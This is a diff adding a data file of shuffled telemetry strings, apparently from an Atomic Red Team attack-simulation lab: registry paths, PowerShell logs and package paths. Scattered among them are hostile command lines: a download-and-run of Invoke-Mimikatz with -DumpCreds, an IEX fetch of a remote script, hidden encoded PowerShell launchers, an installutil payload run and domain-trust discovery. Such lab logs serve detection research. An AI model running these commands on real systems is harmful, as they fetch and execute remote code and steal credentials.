@@ -1,0 +1,500 @@
+update-binfmts --package qemu-user-static --install qemu-mips64el /usr/bin/qemu-mips64el-static --magic \x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x08\x00 --mask \xff\xff\xff\xff\xff\xff\xff\x00\xfe\xff\xff\xff\xff\xff\xff\xff\xfe\xff\xff\xff --offset 0 --credential yes
+ParameterBinding(Sort-Object): name="Property"; value="$_.CompartmentId"
+ID:		{36202223-7d34-47d4-abb7-553a00233549}
+ID:		{e36a7247-6206-4c25-a15d-8830dac417e0}
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack\AsimovUploader\CostDeferredBandwidthMonitor
+[Parameter(ParameterSetName='ByNameDisplayName', Position=0, ValueFromPipelineByPropertyName=$true)]
+if ($PSBoundParameters.ContainsKey('VxlanEncapsulatedPacketTaskOffloadEnabled')) {
+v2.26|Action=Block|Active=TRUE|Dir=In|Name=@{Microsoft.AccountsControl_10.0.14393.2068_neutral__cw5n1h2txyewy?ms-resource://Microsoft.AccountsControl/Resources/DisplayName}|Desc=@{Microsoft.AccountsControl_10.0.14393.2068_neutral__cw5n1h2txyewy?ms-resource://Microsoft.AccountsControl/Resources/DisplayName}|LUOwn=S-1-5-21-1437397836-63413453-3273824210-500|AppPkgId=S-1-15-2-969871995-3242822759-583047763-1618006129-3578262429-3647035748-2471858633|EmbedCtxt=@{Microsoft.AccountsControl_10.0.14393.2068_neutral__cw5n1h2txyewy?ms-resource://Microsoft.AccountsControl/Resources/DisplayName}|
+C:\Users\Administrator\AppData\Local\Temp\ukktdivn.cmdline
+ID:		{8a4f3e07-6389-4a64-b8ef-eabed7cbdf77}
+ID:		{0225a6a0-f895-4117-99dc-ca17c2a2e17d}
+Started invocation of ScriptBlock ID: 00ae0eb7-299c-40db-8190-e509f7fe17ac
+Pipeline execution details for command line: Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Set-NetAdapterVmq' -Alias '*'
+ThrowInvalidArgumentError -ErrorId $errorId -ErrorMessage $errorMessage;
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\MMDevices
+$__cmdletization_values = @(${NextHop})
+%{S-1-5
+/var/lib/dpkg/info/libgirepository-1.0-1:amd64.symbols
+C:\Users\pedro\AppData\Local\Temp\__PSScriptPolicyTest_d5lqktrh.s0o.psm1
+/var/lib/dpkg/info/keyboard-configuration.prerm
+/etc/apparmor.d/abstractions/ubuntu-browsers.d/java
+C:\Windows\System32\AppXDeploymentClient.dll
+\REGISTRY\MACHINE\SOFTWARE\Microsoft\Shell
+OriginalFileName: OLEA
+HKLM\System\CurrentControlSet\Control\WMI\Autologger\AutoLogger-Diagtrack-Listener\{D8C84585-1F65-5D5F-B0A4-BD4499F0812D}\EnableLevel
+/var/lib/dpkg/info/libogg0:amd64.list
+C:\Windows\Temp\D67C1AE8-EF77-4E3C-B7D7-BDCEFA974160\api-ms-win-core-realtime-l1-1-0.dll
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack\HeartBeats\Seville\HeartBeatSequenceNumber
+HKU\S-1-5-21-3078578304-2316546942-2249307483-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyEnable
+C:\Users\Administrator\AppData\Local\Temp\art-err.txt
+TargetObject: HKLM\System\CurrentControlSet\Control\Class\{4d36e97d-e325-11ce-bfc1-08002be10318}\0034\HardwareInformation.AdapterString
+OriginalFileName: WINLOGON.EXE
+/var/lib/dpkg/info/libgstreamer1.0-0:amd64.list
+Web DAV Client DLL
+C:\AtomicRedTeam\tmp\atomic-red-team-local-master\ARTifacts\Chain_Reactions\cookie-miner-stage-02.py
+/var/lib/dpkg/info/libsasl2-2:amd64.list
+TargetObject: HKLM\SOFTWARE\Microsoft\EnterpriseCertificates\TrustedPeople\CRLs
+ImageLoaded: C:\Windows\System32\cabinet.dll
+HostApplication=powershell -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAHIAc
+${IgnoreDefaultRoutes},
+Program Compatibility Assistant Service
+Event in sequence:		1 of 1
+C:\Users\Administrator\AppData\Local\Microsoft\Windows\INetCache\IE\YIULYNLV\Invoke-ExecuteMSBuild[1].ps1
+TargetObject: HKLM\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application\{fff0196f-ee4c-4eaf-9aa5-776f622deb4f}\MatchAnyKeyword
+TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack\SettingsRequests\utc.privacy\LastFileWrittenPath
+bcryptprimitives.dll
+ImageLoaded: C:\Windows\SysWOW64\gpapi.dll
+# The Get-TargetResource cmdlet.
+An operation was attempted on a privileged object.
+/var/lib/dpkg/info/tzdata.postinst
+Windows PKI Client Cmdlets
+HKLM\System\CurrentControlSet\Services\WmiApRpl\Performance\First Counter
+C:\Users\Administrator\AppData\Local\Temp\813559499\powershell-yaml\Tests\powershell-yaml.Tests.ps1
+Details: \REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Console
+${RouteMetric},
+TargetObject: HKLM\System\CurrentControlSet\Services\swenum\Devices
+Started invocation of ScriptBlock ID: ecc3a80d-a0cf-4d31-a78d-e522c3b3c7a2
+sudo composer --working-dir=/tmp/tmp.J2qCaNc1mr run-script x
+/var/lib/dpkg/info/libpam0g:amd64.postrm
+ParameterBinding(Export-ModuleMember): name="Function"; value="Enable-NetAdapterBinding"
+HostVersion=5.
+TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-WindowsAzure-Diagnostics/Runtime\Enabled
+C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_5lsx5iyj.dfy.ps1
+/usr/lib/ubuntu-advantage/apt-esm-hook pre-invoke
+C:\Users\REED_S~1\AppData\Local\Temp\C225BADE-BEAF-4BA4-963B-48C82AD1F05A\api-ms-win-core-localization-l1-2-1.dll
+Host Application = C:\Windows\system32\WindowsPowerShell\v1.0\PowerShe
+/etc/bash_completion.d/apport_completion
+ImageLoaded: C:\Windows\System32\verifier.dll
+HKLM\System\CurrentControlSet\Services\umbus\Enum
+crontab
+HKLM\System\CurrentControlSet\Control\WMI\Autologger\AutoLogger-Diagtrack-Listener\{DBE9B383-7CF3-4331-91CC-A3CB16A3B538}\EnableLevel
+/etc/alternatives/newt-palette
+TargetObject: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{19BBA701-01E6-4521-96D8-FEC7D40413D8}\URI
+C:\Program Files\Mozilla Firefox\updated\softokn3.dll
+Rule Name:	@FirewallAPI.dll,-80201
+TargetObject: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\S-1-5-21-3125456671-949036322-3048627137-1104
+HKLM\System\CurrentControlSet\Control\DeviceContainers\{7f84558c-5f7f-548e-9b12-de35e0efd7ca}\BaseContainers\{7f84558c-5f7f-548e-9b12-de35e0efd7ca}
+ProcessGuid: {297bc33e-aee8-5f2b-fa03-000000000400}
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RESCE44.tmp" "c:\Users\Administrator\AppData\Local\Temp\CSC702E4A9180224E4BA24635B343ACABB3.TMP"
+37139bf3-0f27-462b-8267-c794c719efcb._msdcs.attackrange.local.
+if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
+"C:\Windows\System32\certutil.exe" /verifyctl -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+/bin/readlink
+$__cmdletization_values = @(${AutomaticMetric})
+dpkg-statoverride --update --add root ssl-cert 710 /etc/ssl/private
+ID:		{57f45735-bae6-4548-9107-59cae5d4a832}
+"C:\Windows\system32\cmd.exe" /c "powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText""
+TargetObject: HKLM\System\CurrentControlSet\Control\WMI\Autologger\AutoLogger-Diagtrack-Listener\{B8A83F1E-34C0-4E25-8310-44F46803940C}\MatchAnyKeyword
+TargetObject: HKLM\System\CurrentControlSet\Control\WMI\Autologger\AutoLogger-Diagtrack-Listener\{2161BF9E-E2A6-4463-B9AB-12FAA958D69B}\Enabled
+HostApplication=powershell -noP -sta -w 1 -enc SQ
+C:\Windows\System32\winsta.dll
+Initiated: false
+TargetFilename: C:\Windows\System32\GroupPolicy\DataStore\0\sysvol
+if ($PSBoundParameters.ContainsKey('DisplayValue')) {
+C:\Users\Administrator\AppData\Local\Temp\2\1164442704\AtomicTestHarnesses\TestHarnesses\T1218_SignedBinaryProxyExecution\InvokeRemoteFXvGPUDisablementCommand.ps1
+C:\Windows\SysWOW64\dllhost.exe
+CommandInvocation(Split-Path): "Split-Path"
+$__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'WakeOnPattern'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetAdapterPowerManagement.Setting'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
+TargetObject: HKLM\SOFTWARE\WOW6432Node\Microsoft\Cryptography\Calais\Readers
+Filter
+C:\Users\Administrator\AppData\Local\Temp\rqh4poma\rqh4poma.cmdline
+/var/lib/dpkg/info/libexpat1:amd64.shlibs
+Service Name: 		CDPUserSvc_b0b5d
+HKU\S-1-5-21-968647429-258479840-2507984072-1002\Software\Microsoft\Phone\ShellUI\WindowSizing
+HKU\S-1-5-21-968647429-258479840-2507984072-1002\Software\Microsoft\Windows\CurrentVersion\Explorer\SessionInfo\1\ApplicationViewManagement\W32:0000000000120500\VirtualDesktop
+Process Name:	C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe
+Details: [{00000000-0000-0000-0000-000000000000}{BEE07A6A-EC9F-4659
+"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\ADMINI~1\AppData\Local\Temp\i33t42yb.cmdline"
+Source Handle ID:	0xbdc
+LOGONCLI.DLL
+C:\Windows\Temp\4efe5db1-2d84-40bc-bec6-38980f6d6bb7\bin\CustomScriptHandler.exe.config
+C:\Users\Administrator\AppData\Local\Temp\813559499\powershell-yaml\Load-Assemblies.ps1
+PowerShell.EXE
+ScriptBlock ID: 8f431013-6eda-45f1-9f08-3b4c81f15117
+Source Process ID:	0x1a74
+/boot/grub/i386-pc/part_msdos.mod
+/tmp/sh-thd.RIgtEN
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack\SettingsRequests\WINDOWS.PERFTRACKESCALATIONS\LastDownloadTime
+clusapi
+consent.exe
+C:\Windows\System32\dnsapi.dll
+/var/lib/dpkg/info/libthai0:amd64.symbols
+readlink -f /tmp/apt-key-gpghome.N1QYtwIK3O
+TargetObject: HKU\.DEFAULT\Software\Microsoft\SystemCertificates\CA\Certificates
+chmod 777 installmips.sh
+C:\Users\Administrator\AppData\Local\Temp\2\mgpq32qf\TestHarnesses\T1543.003_WindowsService\DriverInstaller.Tests.ps1
+TargetObject: HKLM\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application\{d38b3095-6abd-419f-a8d5-3d01b8b6a4e7}\MatchAnyKeyword
+C:\Windows\System32\GdiPlus.dll
+HKLM\System\CurrentControlSet\Control\WMI\Autologger\AutoLogger-Diagtrack-Listener\{CAE82C8B-0097-4C53-9D72-F56D14C1284F}\MatchAllKeyword
+C:\Users\Administrator\AppData\Local\Temp\osjfwd4u\osjfwd4u.dll
+SourceImage: C:\windows\Explorer.EXE
+Process ID:	0x13ac
+Started invocation of ScriptBlock ID: f9a08152-785f-4823-b8c3-8b8dfb75ba58
+Pipeline execution details for command line: Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Disable-NetAdapterPacketDirect' -Alias '*'
+/etc/fonts/conf.avail/70-force-bitmaps.conf
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack\TraceManager\aotIsThrottled
+/lib/systemd/system-generators/systemd-hibernate-resume-generator
+Completed invocation of ScriptBlock ID: 6b090e27-5c6f-4f97-9ec0-bc03136da67a
+OriginalFileName: gd
+$__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Forwarding'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetIPInterface.Forwarding'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
+HKLM\System\CurrentControlSet\Control\Class\{4d36e97d-e325-11ce-bfc1-08002be10318}\0034\HardwareInformation.BiosString
+New Process Name:	C:\Users\Administrator\Desktop\launch
+C:\Windows\System32\Faultrep.dll
+ParameterBinding(Export-ModuleMember): name="Function"; value="Enable-NetAdapterChecksumOffload"
+ID:		{ae55144b-80b4-4a50-9b3e-5c1e36144787}
+apt-get install gdb-multiarch -y
+Pipeline execution details for command line: Microsoft.PowerShell.Core\Export-ModuleMember -Function 'New-NetTransportFilter' -Alias '*'
+TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack\SettingsRequests\TELEMETRY.ASM-WINDOWSSQ\SettingsParseType
+Description: Consent UI for administrative applications
+/var/lib/dpkg/info/libpolkit-gobject-1-0:amd64.triggers
+touch /var/lib/apache2/module/enabled_by_maint/auth_basic
+ID:		{b13f3409-836c-4cd1-976d-15ca6c55bfa0}
+SourceProcessGUID: {625b42a0-6b36-62e9-1b00-000000000900}
+Pipeline execution details for command line: 		$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null
+HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles\{C079DBD5-0D3F-49F9-A8D2-ABD45D6CD238}\Description
+/etc/default/ebtables
+ImageLoaded: C:\Windows\System32\shlwapi.dll
+/var/cache/apt/archives/partial/.apt-acquire-privs-test.Nbrm13
+Pipeline execution details for command line: 		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
+C:\ProgramData\Microsoft\Diagnosis\Temp\DiagTrack_diag
+Pipeline execution details for command line: 		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
+Microsoft MetaData Library
+C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_1kihimhx.ijy.psm1
+"C:\Windows\System32\cmd.exe" /c c:\temp\installut.exe /logfile= /LogToConsole=false /U c:\temp\payload.cs
+"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\ADMINI~1\AppData\Local\Temp\5t3yoztu.cmdline"
+TargetObject: HKLM\System\CurrentControlSet\Services\Dnscache\Parameters\DnsActiveIfs
+TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\KindMap
+C:\ProgramData\Microsoft\Diagnosis\ETLLogs\ShutdownLogger\AutoLogger-Diagtrack-Listener.etl
+C:\Windows\Temp\__PSScriptPolicyTest_qlbtohfa.4mf.ps1
+HKLM\SOFTWARE\Microsoft\Wbem\WDM\C:\windows\System32\drivers\mssmbios.sys[MofResource]
+run-parts --report /etc/cron.hourly
+ID:		{6ec4997d-541a-49e7-abd9-282bcf873f71}
+v2.26|Action=Allow|Active=TRUE|Dir=In|Profile=Private|Profile=Public|RA42=RmtIntrAnet|RA62=RmtIntrAnet|Name=@{Microsoft.AAD.BrokerPlugin_1000.14393.0.0_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.AAD.BrokerPlugin/resources/PackageDisplayName}|Desc=@{Microsoft.AAD.BrokerPlugin_1000.14393.0.0_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.AAD.BrokerPlugin/resources/PackageDisplayName}|LUAuth=O:LSD:(A;;CC;;;S-1-15-3-3)(A;;CC;;;WD)(A;;CC;;;AN)|LUOwn=S-1-5-21-1437397836-63413453-3273824210-500|AppPkgId=S-1-15-2-1910091885-1573563583-1104941280-2418270861-3411158377-2822700936-2990310272|EmbedCtxt=@{Microsoft.AAD.BrokerPlugin_1000.14393.0.0_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.AAD.BrokerPlugin/resources/PackageDisplayName}|Security=Authenticate|
+[Parameter(ParameterSetName='ByInstanceIDKeyword', Mandatory=$true, ValueFromPipelineByPropertyName=$true)]
+OriginalFileNam
+function Assert-MemberParameters
+ID:		{f9a6a045-f970-4e44-8fa6-b7a8900280b4}
+ssleay32.dll
+[object]$__cmdletization_value = ${InterfaceIndex}
+ParameterBinding(Set-Alias): name="Name"; value="rcms"
+us-east-2.compute.internal
+/var/lib/dpkg/info/perl.preinst
+[CmdletBinding(DefaultParameterSetName='ByInterfaceAlias', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
+Details: TransparentInstaller
+TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack\HeartBeats\Default\EventStoreResetSizeSum
+ImageLoaded: C:\Windows\System32\DXCore.dll
+Pipeline execution details for command line: 		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
+CreationUtcTime: 2016-
+A notification package has been loaded by the Security Account Manager.
+Task Scheduler launch task "\Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh" , instance "taskhostw.exe"  with process ID 1964.
+/var/cache/apt/archives/partial/.apt-acquire-privs-test.JvYrah
+HostApplication=powershell -n
+Description: Workstation Service Client DLL
+/var/cache/apt/archives/partial/.apt-acquire-privs-test.ywyeki
+/var/lib/dpkg/info/librados2.shlibs
+Application Name:	\device\harddiskvolume2\windows\system32\wininit.exe
+/var/lib/dpkg/info/libgraphite2-3:amd64.md5sums
+ImageLoaded: C:\Windows\SysWOW64\userenv.dll
+TargetObject: HKLM\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application\{9148c98f-152c-44d3-a496-26350c475d74}
+/var/cache/apt/archives/partial/.apt-acquire-privs-test.3HoGhu
+Process ID:		0xcd8
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES34CD.tmp" "c:\Users\Administrator\AppData\Local\Temp\CSCF08DF9FC4FF49FCB84BD6859A5554A6.TMP"
+Description: Microsoft ® Shell Extension for Windows Script Host
+HKU\S-1-5-20\Software\Policies\Microsoft\SystemCertificates\TrustedPeople
+ID:		{bcc2e4e4-976b-44a0-9247-3222c819ab6d}
+/var/cache/apt/archives/partial/.apt-acquire-privs-test.KrheFo
+function Set-NetAdapterPacketDirect
+HKLM\System\CurrentControlSet\Control\{7746D80F-97E0-4E26-9543-26B41FC22F79}\{59AEE675-B203-4D61-9A1F-04518A20F359}
+/tmp/apt.conf.rgPzla
+TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\State\Machine\Extension-List\{00000000-0000-0000-0000-000000000000}\StartTimeHi
+CallTrace: C:\windows\SYSTEM32\ntdll.dll+9d
+"C:\Windows\system32\cmd.exe" /c "powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds""
+HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Perflib\009
+TargetObject: HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Parental Controls\SymbolicLinkValue
+dpkg-split -Qao /var/lib/dpkg/reassemble.deb /tmp/apt-dpkg-install-7NsVNE/036-libcairo2_1.15.10-2ubuntu0.1_amd64.deb
+C:\Windows\System32\runas.exe
+Description: Base Multimedia Extension API DLL
+$script:ClassName = 'ROOT/StandardCimv2/MSFT_NetAdapterPowerManagementSettingData'
+/etc/sos/sos.conf
+ID:		{c53e3a8c-ba1a-4396-b3b3-77ef74b373df}
+C:\Windows\System32\policymanager.dll
+ID:		{0097214b-77b6-4193-8aec-3583a53c8ca1}
+HKLM\System\CurrentControlSet\Control\WMI\Autologger\AutoLogger-Diagtrack-Listener\{A7CC0239-717B-4C3C-B74D-2A9B56C0DDAF}\MatchAnyKeyword
+TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack\AsimovUploader\CostDeferredBandwidthMonitor\LastUploadIndex
+TargetObject: HKLM\SOFTWARE\Microsoft\Ras
+[Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetIPInterface.AutomaticMetric]
+$distinguishedNameParts = $DN -split '(?&lt;![\\]),';
+C:\Users\Administrator\AppData\Local\Temp\2\__PSScriptPolicyTest_miqmlna5.eyk.ps1
+TargetObject: HKLM\SOFTWARE\WOW6432Node\Microsoft\Cryptography\Calais\Readers\SymbolicLinkValue
+Windows (R) Win 7 DDK driver
+Pipeline execution details for command line: 		$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
+/etc/fonts/conf.avail/69-language-selector-zh-cn.conf
+TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack\EventMonitors\Microsoft.Windows.Sentinels.Normal_0\FireCount
+$__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AutoReusePortRangeStartPort'; ParameterType = 'System.UInt16'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
+/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
+/etc/default/keyboard
+TargetProcessGUID: {3ddc5665-d700-5f51-5400-000000000400}
+TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-WindowsAzure-Diagnostics/Bootstrapper\Type
+Details: SQBGACgAJABQAFMAVgBFAFIAUwBpAG8AbgBUAEEAQgBsAEUALgBQA
+ID:		{e0f0201a-0730-495f-a80d-c26053ca2a59}
+C:\Windows\Temp\__PSScriptPolicyTest_sl3hgmcu.ccl.ps1
+BL200105051246
+TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\SyncRootManager
+nltest  /domain_trusts
+Group Policy Applied:	No
+/tmp/apt-dpkg-install-7NsVNE/108-qemu-system-ppc_1%3a2.11+dfsg-1ubuntu7.39_amd64.deb
+TargetObject: HKLM\SAM\SAM\Domains\Account\F
+"C:\Users\ADMINI~1\AppData\Local\Temp\advancedrun\AdvancedRun.exe" /cfg C:\Users\ADMINI~1\AppData\Local\Temp\advancedrun\AdvancedRun.cfg /run
+1. Redistributions of source code must retain the above copyright notice, this list of conditions and the
+Completed invocation of ScriptBlock ID: 70b8f632-04c6-4f53-b0e0-68ce865bcb60
+/var/lib/dpkg/info/dpkg.list
+C:\Windows\System32\svchost.exe
+/var/cache/apt/archives/partial/.apt-acquire-privs-test.NMMrAq
+/tmp/fileutl.message.Gihwao
+ParameterBinding(Get-Location): name="PSProvider"; value="FileSystem"
+"C:\Program Files\SplunkUniversalForwarder\bin\SplunkD.EXE" check-license
+C:\AtomicRedTeam\tmp\atomic-red-team-local-master\atomics\T1218\src\Win32\T1218-2.dll
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack\LatencyDataLastUploadTime
+apt-config shell REMOVED_KEYS APT::Key::RemovedKeys
+TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\DataStore\Machine\0\0
+Description: Remote Procedure Call Runt
+Completed invocation of ScriptBlock ID: d25e72f7-8503-4332-af96-2c6504abb88b
+Handle ID:		0x9bc
+${AdvertisedRouterLifetime},
+C:\Windows\System32\GroupPolicy\DataStore\0\sysvol\theshire.local\Policies
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\History\{B087BE9D-ED37-454F-AF9C-04291E351182}\0\Link
+/etc/systemd/system/sysinit.target.wants/keyboard-setup.service
+/etc/apparmor.d/abstractions/php5
+"C:\windows\system32\SearchFilterHost.exe" 0 772 776 784 8192 780
+Windows.UI.Xaml.Controls
+C:\Windows\System32\mmc.exe
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\NetworkServiceTriggers\Triggers\bc90d167-9470-4139-a9ba-be0bbbf5b74d\BF4DC912-E52F-4904-8EBE-9317C1BDD497
+C:\Windows\Temp\__PSScriptPolicyTest_qnokasu0.nmu.ps1
+HKLM\SOFTWARE\Microsoft\Wbem\WDM\DREDGE\C:\Windows\System32\drivers\ACPI.sys[ACPIMOFResource]
+${DAIPsecEncryptionType},
+Application Name:	\device\harddiskvolume2\windows\system32\dns.exe
+TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Publishers\{9e3b8bee-15eb-444b-a692-bab4546644f2}
+HKLM\SOFTWARE\Microsoft\Wbem\WDM\C:\windows\System32\drivers\en-US\ACPI.sys.mui[ACPIMOFResource]
+Name = "SCM Event Log Filter";
+/var/lib/dpkg/info/libc6-mipsel-cross.list
+C:\Users\Administrator\AppData\Local\Temp\p2mkvfaq.cmdline
+C:\Windows\Installer\e4f5149.msi
+HKU\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\ThemeManager\LastLoadedDPI
+cs9.wac.phicdn.net
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack\SettingsRequests\utc.cert\SettingsRegistrationType
+TargetProcessGUID: {625b42a0-4112-62e9-4e00-000000000900}
+ID:		{7346ec22-9783-4aa1-8a0a-c50a23bd2c1e}
+ID:		{4895c5e6-cda6-4237-9371-b85d1e1cc00a}
+\REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Session Manager\Environment
+Description: .
+C:\Windows\Temp\4F433611-5F9A-4494-AC75-0269C64E6C9B\ProvProvider.dll
+{ @('InputObject (cdxml)') -contains $_ } {
+TargetObject: HKLM\System\CurrentControlSet\Services\netvsc
+HKLM\System\CurrentControlSet\Control\WMI\Autologger\AutoLogger-Diagtrack-Listener\{430B0771-8705-440C-AB02-93215F47C9BD}\EnableProperty
+/tmp/fileutl.message.7EQEXI
+ID:		{8ae63248-77ed-4fec-b629-647fd530e2ae}
+/var/lib/dpkg/info/libgcrypt20:amd64.md5sums
+HKLM\System\CurrentControlSet\Control\WMI\Autologger\AutoLogger-Diagtrack-Listener\{A7CC0239-717B-4C3C-B74D-2A9B56C0DDAF}\MatchAllKeyword
+[object]$__cmdletization_value = ${ResetServerAddresses}
+/var/cache/apt/archives/partial/.apt-acquire-privs-test.Rq2wMo
+/var/lib/dpkg/info/libusbredirparser1:amd64.list
+$__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#DnsClientNrptGlobal'
+ParameterBinding(Get-NetAdapterBinding): name="ThrottleLimit"; value="0"
+env -i LANG=C.UTF-8 LANGUAGE= LC_CTYPE=C.UTF-8 LC_NUMERIC= LC_TIME= LC_COLLATE= LC_MONETARY= LC_MESSAGES= LC_PAPER= LC_NAME= LC_ADDRESS= LC_TELEPHONE= LC_MEASUREMENT= LC_IDENTIFICATION= LC_ALL= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin TERM=xterm-256color /etc/init.d/ebtables status
+TargetObject: HKLM\System\CurrentControlSet\Control\WMI\Autologger\AutoLogger-Diagtrack-Listener\{2839FF94-8F12-4E1B-82E3-AF7AF77A450F}
+{9e3b8bee-15eb-444b-a692-bab4546644f2}
+Process Name:		C:\Windows\System32\wevtutil.exe
+/var/lib/dpkg/info/libpolkit-backend-1-0:amd64.symbols
+/usr/bin/install-info
+ProcessGuid: {3ddc5665-d6fb-5f51-4b00-000000000400}
+if ($PSBoundParameters.ContainsKey('WeakHostReceive') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
+ID:		{2db25e6c-f07a-44f4-b6c8-50a330d2790b}
+ID:		{ccf1f6c9-670a-41f8-94dd-a5944f0ac2d4}
+TargetProcessGUID: {3ddc5665-e7cb-5f51-0c00-000000000500}
+ParameterBinding(Export-ModuleMember): name="Function"; value="Get-DnsClientNrptRule"
+UninstallFeature=Trying to Uninstall feature {0} using Server Manager cmdlet Remove-WindowsFeature.
+C:\Windows\Prefetch\ReadyBoot\ReadyBoot.etl
+HKLM\System\CurrentControlSet\Services\mpssvc\Parameters\PortKeywords
+${RegisterThisConnectionsAddress},
+TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack\HeartBeats\Aria\CompressedBytesUploaded
+ID:		{d96b201d-be7d-4fe7-97b6-f649de0f41cc}
+C:\Users\Administrator\AppData\Local\Temp\2\T1086_PowerShell_Session_Creation_and_Use
+AMD64 Wow64 CPU
+/var/lib/dpkg/info/libcairo-gobject2:amd64.shlibs
+$__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SettingName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
+$__cmdletization_values = @(${Id})
+TargetObject: HKLM\System\CurrentControlSet\Services\CDPUserSvc_1fa105
+ImageLoaded: C:\Windows\SysWOW64\combase.dll
